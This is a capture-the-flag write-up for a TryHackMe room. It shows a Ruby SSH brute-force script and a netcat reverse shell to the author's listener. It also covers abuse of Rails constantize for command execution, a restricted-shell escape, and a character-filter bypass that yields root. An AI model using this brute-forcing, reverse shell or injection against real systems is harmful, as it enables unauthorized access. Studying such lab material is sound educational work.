# Red Stone One Carat

## Introduction

Welcome to my another writeup! In this TryHackMe [Red Stone One Carat](https://tryhackme.com/room/redstoneonecarat) room, you'll learn: Writing Ruby script, restricted shell escape and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: noraj to root](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

> First room of the Red Stone series. Hack ruby using ruby.
> 
> Difficulty: Medium

---

Rooms of the **Red Stone** series share the same goals:

- Discovering and learning [Ruby](https://www.ruby-lang.org)
- Scripting and hacking with [Ruby](https://www.ruby-lang.org/)
- Exploiting and identifying vulnerabilities in [Ruby](https://www.ruby-lang.org/) programs

I'll give you a valuable source to find stuff related to Offensive Security using Ruby: [https://rubyfu.net/](https://rubyfu.net/).

**Disclaimer**: this room requires custom exploitation and scripting and is more CTF-like than real life applicable.  

The intended way of this challenge is to complete it by only using Ruby.

## Task 2 - Flags

Start with SSH bruteforce on user `noraj`.

---

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
╭─root at siunam in ~/ctf/thm/ctf/Red-Stone-One-Carat 2023-01-12 - 8:50:20
╰─○ export RHOSTS=10.10.232.55 
╭─root at siunam in ~/ctf/thm/ctf/Red-Stone-One-Carat 2023-01-12 - 8:50:28
╰─○ rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fee7f2f67465a6ddf294cd45fdf32b2a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHVsUg1GJYLWn/T/EkTfAMV4tdmLEiJvPP4cCCbx7hFt3ma0FAQpMMAoXFP12+hePBl
|   256 34a316aab31f83ac91a331b445943cc9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJf9gbS/xBNED4k9vQscQ6Xi4VMzkK2M=
|   256 7523c066c72c6e120af704612bc61262 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7ai11Zz/i/bAw8SQG0aBJfcYjdIiQQiAXhV8/9b3km
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 1 port is opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu

### SSH on Port 22

First, let's prepare the wordlist.

In the room's hint, it said:

> The password contains "bu".

**Let's use `grep` to grab all passwords that contain `bu`:**
```shell
╭─root at siunam in ~/ctf/thm/ctf/Red-Stone-One-Carat 2023-01-12 - 10:04:10
╰─○ grep 'bu' /usr/share/wordlists/rockyou.txt > bu_password.txt
```

## Initial Foothold

**Then, we can write a ruby script to brute force user `noraj`'s password.**
```ruby
#!/usr/bin/env ruby
require 'rubygems'
require 'net/ssh'
require 'thread'

class Exploit
    def initialize(rhosts)
        @rhosts = rhosts
    end

    def bruteforceSSH(filename, username)

        # Method that connect to target's SSH port
        def connectSSH(username, password)
            begin
                puts "[*] Trying credentials: #{username}:#{password}"

                Net::SSH.start(@rhosts, username, :password => 'test',
                           :auth_methods => ["password"], :port => 22,
                           :non_interactive => true, :timeout => 10 ) do
                    puts "[+] Found valid credentials: #{username}:#{password}"
                end
            # Password is wrong
            rescue Net::SSH::AuthenticationFailed

            end
        end

        # Create a File object
        file = File.open(filename)

        # Read the whole file into one array of lines
        file.readlines.each do |password|
            # For each password, create a new thread to method connectSSH
            thread = Thread.new {connectSSH(username, password)}

            # Sleep 0.5s to prevent rate limiting in SSH
            sleep(0.5)
        end
    end
end

def main()
    rhosts = '10.10.232.55'
    username = 'noraj'
    passwordWordlist = 'bu_password.txt'

    objectExploit = Exploit.new(rhosts)
    objectExploit.bruteforceSSH(passwordWordlist, username)
end

if $PROGRAM_NAME == __FILE__
    main()
end
```

```shell
╭─root at siunam in ~/ctf/thm/ctf/Red-Stone-One-Carat 2023-01-12 - 10:20:25
╰─○ ruby bruteforce_ssh.rb
[...]
[+] Found valid credentials: noraj:chesseburger
```

**Found it! Let's SSH into user `noraj`!**
```shell
╭─root at siunam in ~/ctf/thm/ctf/Red-Stone-One-Carat 2023-01-12 - 10:28:06
╰─○ ssh noraj@$RHOSTS
noraj@10.10.232.55's password: 
getent:6: command not found: grep
compdump:136: command not found: mv
red-stone-one-carat% whoami;hostname;id;ip a
zsh: command not found: whoami
zsh: command not found: hostname
zsh: command not found: id
zsh: command not found: ip
red-stone-one-carat% /bin/bash
zsh: /bin/bash: restricted
```

**Hmm... Looks like we're in a restricted zsh shell!**

**Let's view the environment variables:**
```shell
red-stone-one-carat% export
HOME=/home/noraj
LANG=en_US.UTF-8
LANGUAGE=en_US:
LOGNAME=noraj
MAIL=/var/mail/noraj
OLDPWD=/home/noraj
PATH=/home/noraj/bin
PWD=/home/noraj
SHELL=/bin/rzsh
SHLVL=1
SSH_CLIENT='10.9.0.253 53598 22'
SSH_CONNECTION='10.9.0.253 53598 10.10.232.55 22'
SSH_TTY=/dev/pts/0
TERM=xterm-256color
USER=noraj
XDG_RUNTIME_DIR=/run/user/1001
XDG_SESSION_ID=25
```

As you can see, our `SHELL` variable is `/bin/rzsh`, which is a restricted zsh shell.

**After poking around, I found that we can use `echo`:**
```shell
red-stone-one-carat% echo 'hello'
hello
```

**Armed with above information, we can use `echo *` and `echo .*` to list files:**
```shell
red-stone-one-carat% echo * 
bin user.txt

red-stone-one-carat% echo .*
.cache .hint.txt .zcompdump.red-stone-one-carat.1404 .zshrc

red-stone-one-carat% echo bin/*
bin/rzsh bin/test.rb
```

**The `bin/test.rb` looks interesting. Let's execute that:**
```ruby
red-stone-one-carat% test.rb
#!/usr/bin/ruby

require 'rails'

if ARGV.size == 3
    klass = ARGV[0].constantize
    obj = klass.send(ARGV[1].to_sym, ARGV[2])
else
    puts File.read(__FILE__)
end
```

Let's break it down:

- If the number of arguments are equal to 3:
    - **Set the `test.rb` script to find a declared constant with the name specified in the string**
- If no argument is given, print the source code of `test.rb`

**According to this [blog](https://launchscout.com/blog/getting-creative-with-constantize-in-ruby-on-rails), the `constantize` is insecure:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Red-Stone-One-Carat/images/Pasted%20image%2020230112105502.png)

So, the `constantize` prevents "any" ruby code from being executed, it allows unintended classes to be initiate.

**Now, to abuse that, we can use class `Kernel`, class method `exec()`, and argument `<command>`:**
```ruby
test.rb Kernel 'system' "/bin/sh"
```

**This should spawn a sh shell for us:**
```shell
red-stone-one-carat% test.rb Kernel 'system' "/bin/sh"     
red-stone-one-carat% 
```

Hmm... Doesn't work.

Let's take a step back.

**If we can execute any OS command from `test.rb`, why not just use that ruby script?**
```shell
red-stone-one-carat% test.rb Kernel 'system' "/bin/ls -lah"
total 72K
drwxr-xr-x 4 noraj   noraj   4.0K Jan 12 03:28 .
drwxr-xr-x 4 root    root    4.0K May 17  2021 ..
drwxr-xr-x 2 root    root    4.0K May 17  2021 bin
drwx------ 2 noraj   noraj   4.0K Jan 12 03:28 .cache
-rw-r--r-- 1 vagrant vagrant   36 May 17  2021 .hint.txt
-rw-r--r-- 1 vagrant vagrant   37 May 17  2021 user.txt
-rw-rw-r-- 1 noraj   noraj    42K Jan 12 03:28 .zcompdump.red-stone-one-carat.1398
-rw-r--r-- 1 vagrant vagrant   20 May 17  2021 .zshrc
```

It worked!

**Let's get a reverse shell!**
```shell
╭─root at siunam in ~/ctf/thm/ctf/Red-Stone-One-Carat 2023-01-12 - 11:36:07
╰─○ nc -lnvp 443
listening on [any] 443 ...
```

```shell
red-stone-one-carat% test.rb Kernel 'system' "/bin/nc.traditional 10.9.0.253 443 -e /bin/sh" 
exec /bin/sh failed : Permission denied
```

Wait, permission denied?

**Let's try `zsh`:**
```shell
red-stone-one-carat% test.rb Kernel 'system' "/bin/nc.traditional 10.9.0.253 443 -e /bin/zsh"
```

```shell
╭─root at siunam in ~/ctf/thm/ctf/Red-Stone-One-Carat 2023-01-12 - 11:36:10
╰─○ nc -lnvp 443
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.47.251] 52508
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
whoami;hostname;id
noraj
red-stone-one-carat
uid=1001(noraj) gid=1001(noraj) groups=1001(noraj)
```

It worked!

**However, it's still very restricted:**
```shell
cat user.txt
zsh: permission denied: cat
```

**After fumbling around, I also found that we can use `echo` to read file:**
```shell
echo $(<.hint.txt)
Maybe take a look at local services.
```

**user.txt:**
```shell
echo $(<user.txt)
THM{Redacted}
```

## Privilege Escalation

### noraj to root

**In the `.hint.txt` file, it said:**

> Maybe take a look at local services.

**We can use `netstat` or `ss` to list all listening ports:**
```shell
netstat -tunlp
zsh: permission denied: netstat
ss
zsh: permission denied: ss
```

Hmm...

**Since the target machine has `nc`, we can leverage that to scan all ports:**
```shell
nc -zvnw 1 127.0.0.1 1-65535
(UNKNOWN) [127.0.0.1] 31547 (?) open
(UNKNOWN) [127.0.0.1] 22 (ssh) open
```

- Found 1 open port: `31547`

**In here, we could just `nc` to port `31547`, so we're inside a `nc` session of a `nc` session:**
```shell
nc 127.0.0.1 31547
$ 
```

```ruby
$ echo hello?
undefined method `hello?' for main:Object
```

Hmm... Looks like we're inside a ruby pseudo shell.

**We can try to read file:**
```ruby
$ File.read('/etc/passwd') 
Forbidden character
```

Umm... Our input is getting filtered?

**Let's test which characters are filtered:**
```ruby
Forbidden character
$ (   
Forbidden character
$ )
Forbidden character
$ [
Forbidden character
$ ]
Forbidden character
$ .
Forbidden character
$ '
Forbidden character
$ "
Forbidden character
```

- Forbidden character: `()[].'"`

Now, we need to bypass that to get OS command execution.

**According to this [StackOverflow](https://stackoverflow.com/questions/2232/how-to-call-shell-commands-from-ruby) post, we can execute command via:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Red-Stone-One-Carat/images/Pasted%20image%2020230112115835.png)

**Let's do that:**
```shell
$ %x{id}
uid=0(root) gid=0(root) groups=0(root)
```

Nice! We can execute any commands!

```shell
$ %x{ls -lah /root}
total 32K
drwx------  4 root    root    4.0K May 17  2021 .
drwxr-xr-x 23 root    root    4.0K May 17  2021 ..
-rw-r--r--  1 root    root    3.1K May 12  2021 .bashrc
drwx------  2 root    root    4.0K May 12  2021 .cache
drwx------  3 root    root    4.0K May 12  2021 .gnupg
-rw-r--r--  1 root    root     148 Aug 17  2015 .profile
-rw-r--r--  1 vagrant vagrant   37 May 17  2021 root.txt
-rwxr-xr--  1 vagrant vagrant  612 May 17  2021 server.rb
```

### Rooted

**root.txt:**
```shell
$ %x{cat /root/*}
THM{Redacted}[...]
```

# Conclusion

What we've learned:

1. Writing Ruby Script to Brute Force SSH
2. Exploiting Ruby on Rails Insecure `constantize`
3. Escaping Restricted Shell
4. Ruby Filter Bypass